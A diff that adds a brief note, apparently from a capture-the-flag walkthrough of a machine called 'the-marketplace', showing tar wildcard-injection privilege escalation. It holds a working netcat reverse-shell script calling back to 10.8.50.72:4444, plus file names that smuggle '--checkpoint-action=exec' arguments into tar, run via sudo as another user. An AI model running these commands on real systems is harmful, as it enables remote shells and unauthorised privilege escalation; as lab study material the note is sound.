@@ -1,0 +1,16 @@
+tar
+
+```
+cat > /opt/backups/shell.sh << EOF
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.50.72 4444 >/tmp/f
+EOF
+```
+
+```
+jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"
+jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
+jake@the-marketplace:~$ cd /opt/backups/
+jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
+```
